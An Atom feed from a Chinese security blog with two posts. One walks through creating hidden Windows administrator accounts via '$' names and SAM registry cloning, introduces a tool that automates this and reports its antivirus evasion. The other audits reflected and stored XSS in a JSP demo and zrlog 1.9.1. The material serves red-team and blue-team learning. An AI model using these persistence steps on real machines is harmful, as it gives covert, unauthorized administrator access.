<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TeamsSix</title>
  
  
  <link href="https://www.teamssix.com/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2022-01-18T06:07:16.243Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>TeamsSix</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【工具分享】一键创建隐藏账号</title>
    <link href="https://www.teamssix.com/220118-134825.html"/>
    <id>https://www.teamssix.com/220118-134825.html</id>
    <published>2022-01-18T05:48:25.000Z</published>
    <updated>2022-01-18T06:07:16.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近在对以前所做的笔记进行梳理的时候，发现还没记录过隐藏账号的笔记，这里就补充一下。</p><p>在补充的过程中发现，利用注册表创建隐藏账号的方法还是挺繁琐的，虽然已经有一键化的工具，但是使用起来都不是太顺手，另外在使用某款工具的过程中还把我虚拟机干炸了，幸好打的有快照。</p><p>既然没有顺手的，那就自己写一个吧，不过在此之前，还是先看看手动是怎么创建隐藏账号的。</p><h1 id="0x01-手动创建隐藏账号与发现的方法"><a href="#0x01-手动创建隐藏账号与发现的方法" class="headerlink" title="0x01 手动创建隐藏账号与发现的方法"></a>0x01 手动创建隐藏账号与发现的方法</h1><h2 id="方法一：添加-符"><a href="#方法一：添加-符" class="headerlink" title="方法一：添加 $ 符"></a>方法一：添加 $ 符</h2><p>添加隐藏用户并添加到管理员组</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ Passw0rd <span class="token operator">/</span>addnet localgroup administrators teamssix$ <span class="token operator">/</span>add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181400117.png"></p><p>在使用 net user 查看当前用户时，是看不到这个用户的，但是在控制面板里可以看到该用户</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401187.png"></p><p>使用 wmic 也能看到该用户</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">wmic useraccount get Name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402599.png"></p><p>删除该用户直接用 net user 即可</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401888.png"></p><h2 id="方法二：修改注册表"><a href="#方法二：修改注册表" class="headerlink" title="方法二：修改注册表"></a>方法二：修改注册表</h2><p>打开注册表</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">HKEY_LOCAL_MACHINE\SAM\SAM\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>赋予管理员用户完全控制的权限</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402115.png"></p><p>关闭注册表，再次来到刚才的路径，这时就可以看到 SAM 文件夹里的内容了</p><p>这时需要导出三个文件：</p><ul><li>Users 下的管理员文件</li><li>Users 下的隐藏账号文件</li><li>Names 下的隐藏账号文件</li></ul><p>Users 下的文件名可能不太好判断归属那个用户，不过在选择 Names 下的用户时，可以看到相应的类型值，比如 teamssix$ 账号对应的是 0x3ea，那么 Users 下的文件夹就是 000003EA，同理找到管理员 Administrator 对应的是 00001F4</p><p>找到这三个文件后，右击选择导出</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181402156.png"></p><p>使用记事本打开导出的 Users 下的两个文件，将 Administrator 中的 F 键值内容进行替换到 teamssix$ 中</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181403665.png"></p><p>然后删除 teamssix$ 用户</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181401888.png"></p><p>这个时候其实 teamssix$ 用户就被删掉了，然后利用刚才的注册表文件再添加上 teamssix$ 用户</p><p>双击刚才导出的 Users 下的 teamssix$ 文件和 Names 下的 teamssix$ 文件。</p><p>此时，利用注册表新建隐藏账号就做好了，不管是 net user 还是控制面板都看不到该用户。</p><p>使用 net user teamssix$ 能看到该用户，说明该用户是存在的。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181403858.png"></p><p>从上面图片可以看到其实账号是禁用的状态，因此想使用这个账号，还得给它启用才行</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">net user teamssix$ <span class="token operator">/</span>active<span class="token punctuation">:</span>yes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果想删除这个账号，在注册表中删除 Users 下的 000003EA 和 Names 下的 teamssix$ 就行了。</p><p>不过这种方法依然是有破绽的，比如在注册表里还是能发现 teamssix$ 用户的，使用 wmic 也能看到该用户。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181404578.png"></p><p>而且当电脑重启后，在计算机管理里也能看到刚刚创建的隐藏账号。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181404120.png"></p><h1 id="0x02-创建隐藏账号的工具介绍"><a href="#0x02-创建隐藏账号的工具介绍" class="headerlink" title="0x02 创建隐藏账号的工具介绍"></a>0x02 创建隐藏账号的工具介绍</h1><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>对比了下两种方法，虽然都有办法去发现隐藏账号，但是第二种修改注册表的方法很明显隐藏性还是更好些，只是操作起来有些麻烦，但是又没有什么用着顺手的工具，所以这里自己写了一个利用注册表添加隐藏账号的小工具。</p><p><strong>免责声明：请勿将工具用于非法用途，开发人员不承担任何责任，也不对任何滥用或损坏负责。</strong></p><p>工具地址：<a href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181405087.png">命令帮助信息</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token operator">-</span>c 检查当前系统的隐藏账户<span class="token operator">-</span>d 指定要删除的用户名，如果添加的用户名不是以 $ 结尾，则工具会自动在用户名后添加上 $<span class="token operator">-</span>p 指定添加的用户的密码<span class="token operator">-</span>u 指定要添加的用户名，如果添加的用户名不是以 $ 结尾，则工具会自动在用户名后添加上 $<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>例如这里添加一个用户名为 teamssix 的隐藏账号，工具会自动在用户名后添加 $ 符，因此创建后的用户名为 teamssix$</p><p>使用的时候，记得在管理员权限下运行，不然会提示权限不足</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>u teamssix <span class="token operator">-</span>p Passw0rd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181405373.png"></p><p>创建完后，通过 net user 和控制面板等等都是看不到这个账号的</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406619.png"></p><p>检查当前系统的隐藏账号</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406908.png"></p><p>删除 teamssix 隐藏账号，当删除完账号后，再次检查当前系统的隐藏账号，可以看到就提示没有隐藏账号了</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>d teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406722.png"></p><h2 id="免杀能力"><a href="#免杀能力" class="headerlink" title="免杀能力"></a>免杀能力</h2><p>因为在工具里是利用 Windows API 创建的用户，所以天然具有一定的免杀能力，不过因为工具里需要对注册表进行操作，所以还是会被杀软发现。</p><p>我这里用 360 和火绒测试了下免杀的能力，情况大体如下：</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406221.png"></p><p>整体上，除了在添加用户的时候，360 会弹窗询问要不要允许修改注册表外，其他时候杀软都是没动静的，个人觉着还行。</p><p>不过这个也只是我当时的检测情况，也许明天后天就会被查杀，这个也是很正常的事儿。</p><h1 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h1><p>我看到一些同类工具只有添加隐藏账号的功能，这个工具除了添加隐藏账号外，我还给它也加入了检查隐藏账号和删除隐藏账号的功能，这样不管是红队还是蓝队，都可以使用到这款工具。</p><p>最后，如果有什么 bug 可以直接在 Github 的项目地址上给我提 issue，另外 Star 就不要了，你懂的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近在对以前所做的笔记进行梳理的时候，发现还没记录过隐藏账号的笔记，这里就补充一下。&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="工具分享" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    <category term="蓝队" scheme="https://www.teamssix.com/tags/%E8%93%9D%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】跨站脚本 XSS</title>
    <link href="https://www.teamssix.com/211220-164519.html"/>
    <id>https://www.teamssix.com/211220-164519.html</id>
    <published>2021-12-20T08:45:19.000Z</published>
    <updated>2021-12-21T07:18:39.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-反射型-XSS"><a href="#0x01-反射型-XSS" class="headerlink" title="0x01 反射型 XSS"></a>0x01 反射型 XSS</h1><p>以下代码展示了反射型 XSS 漏洞产生的大概形式</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> studentId <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"sid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"name = "</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"studentId = "</span><span class="token operator">+</span>studentId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当访问 <a href="http://localhost:8080/xss_demo/reflected_xss.jsp?name=1&sid=alert(1)">http://localhost:8080/xss_demo/reflected_xss.jsp?name=1&amp;sid=%3Cscript%3Ealert(1)%3C/script%3E</a> 时，就会触发 XSS 代码</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646020.png"></p><h1 id="0x02-存储型-XSS"><a href="#0x02-存储型-XSS" class="headerlink" title="0x02 存储型 XSS"></a>0x02 存储型 XSS</h1><p>这里以 zrlog v1.9.1.0227 靶场进行示例</p><h2 id="部署靶场"><a href="#部署靶场" class="headerlink" title="部署靶场"></a>部署靶场</h2><p>靶场 war 包下载地址：<a href="http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war">http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war</a></p><p>安装参考官方安装文档即可：<a href="https://blog.zrlog.com/post/how-to-install-zrlog">https://blog.zrlog.com/post/how-to-install-zrlog</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>来到后台，编辑标题处，在标题的位置插入 XSS 语句</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646981.png"></p><p>访问主页，可以看到 XSS 语句被执行</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646003.png"></p><p>通过抓包可以看到提交 XSS 语句时的 URL 为 /api/admin/website/update</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看该项目的 Web.xml 可以看到通过类 com.zrlog.web.config.ZrLogConfig 进行访问控制</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>configClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>com.zrlog.web.config.ZrLogConfig<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 查看 WEB-INF/classes/com/zrlog/web/config/ZrLogConfig.class 文件</p><p>可以看到这份源码的路由配置信息</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configRoute</span><span class="token punctuation">(</span><span class="token class-name">Routes</span> routes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/post"</span><span class="token punctuation">,</span> <span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">,</span> <span class="token class-name">APIController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/install"</span><span class="token punctuation">,</span> <span class="token class-name">InstallController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AdminRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看 AdminRoutes() 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">AdminRoutes</span> <span class="token keyword">extends</span> <span class="token class-name">Routes</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">AdminRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> <span class="token class-name">AdminPageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin/template"</span><span class="token punctuation">,</span> <span class="token class-name">AdminTemplatePageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin/article"</span><span class="token punctuation">,</span> <span class="token class-name">AdminArticlePageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin"</span><span class="token punctuation">,</span> <span class="token class-name">AdminController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/link"</span><span class="token punctuation">,</span> <span class="token class-name">LinkController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/comment"</span><span class="token punctuation">,</span> <span class="token class-name">CommentController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/tag"</span><span class="token punctuation">,</span> <span class="token class-name">TagController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/type"</span><span class="token punctuation">,</span> <span class="token class-name">TypeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/nav"</span><span class="token punctuation">,</span> <span class="token class-name">BlogNavController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/article"</span><span class="token punctuation">,</span> <span class="token class-name">ArticleController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/website"</span><span class="token punctuation">,</span> <span class="token class-name">WebSiteController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/template"</span><span class="token punctuation">,</span> <span class="token class-name">TemplateController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/upload"</span><span class="token punctuation">,</span> <span class="token class-name">UploadController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/upgrade"</span><span class="token punctuation">,</span> <span class="token class-name">UpgradeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 16 行可以看到 /api/admin/website 对应到 WebSiteController 类</p><p>查看 WebSiteController 类的代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">WebSiteSettingUpdateResponse</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> requestMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">ZrLogUtil</span><span class="token punctuation">.</span><span class="token function">convertRequestBody</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> requestMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> param <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WebSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">updateByKV</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>param<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> param<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">WebSiteSettingUpdateResponse</span> updateResponse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSiteSettingUpdateResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    updateResponse<span class="token punctuation">.</span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> updateResponse<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码的第 2 行可以看到，update 方法会把传输过来的数据存储到 requestMap 对象里，并通过 updateByKV 方法进行数据更新。</p><p>因此这里需要对 updateByKV 进行分析，判断其有没有对输入内容进行过滤。</p><p>查看 updateByKV 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">updateByKV</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">queryInt</span><span class="token punctuation">(</span><span class="token string">"select siteId from "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">" where name=?"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"update "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">" set value=? where name=?"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"insert "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">"(`value`,`name`) value(?,?)"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这里并没有对数据进行过滤，直接将数据存储到了数据库里。</p><p>接下来分析一下输出的地方</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>site-name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;_res.title&#125;<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;rurl&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;_res.title&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>slogan<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$&#123;website.title&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>${website.title} 这种写法也没有做转义，也成为了触发 XSS 的一环。</p><blockquote><p>原文链接：</p><p><a href="https://www.teamssix.com/211220-164519.html">https://www.teamssix.com/211220-164519.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-反射型-XSS&quot;&gt;&lt;a href=&quot;#0x01-反射型-XSS&quot; class=&quot;headerlink&quot; title=&quot;0x01 反射型 XSS&quot;&gt;&lt;/a&gt;0x01 反射型 XSS&lt;/h1&gt;&lt;p&gt;以下代码展示了反射型 XSS 漏洞产生的大概形式&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
